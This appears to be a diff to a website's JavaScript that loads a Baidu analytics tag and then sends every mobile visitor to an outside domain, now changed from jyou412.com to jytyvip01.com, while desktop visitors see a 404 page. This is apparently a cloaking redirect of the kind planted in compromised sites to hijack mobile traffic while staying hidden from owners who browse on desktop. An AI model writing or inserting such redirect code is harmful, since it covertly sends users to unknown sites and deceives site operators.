@@ -6,7 +6,7 @@ var _hmt = _hmt || [];
   s.parentNode.insertBefore(hm, s);
 })();
 if((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
-	var arr = ["http://jyou412.com", "http://jyou412.com"];
+	var arr = ["http://jytyvip01.com", "http://jytyvip01.com"];
 	window.location.href = arr[parseInt(Math.random() * arr.length)];
 }else{
 	window.location.href="/404.html";
